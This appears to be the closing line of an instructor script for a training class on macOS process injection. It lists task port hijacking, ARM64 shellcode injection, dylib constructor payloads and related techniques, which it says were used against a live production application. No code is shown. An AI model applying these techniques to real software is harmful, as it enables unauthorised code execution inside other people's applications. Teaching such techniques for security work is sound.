**Say**: "Class complete. You have built and executed: raw Mach IPC, task port hijacking, cross-process memory surgery, ARM64 shellcode injection, Mach-to-POSIX thread promotion, dyld shared cache address resolution, and a full dylib constructor payload — all against a real, running, entitlement-carrying production application."

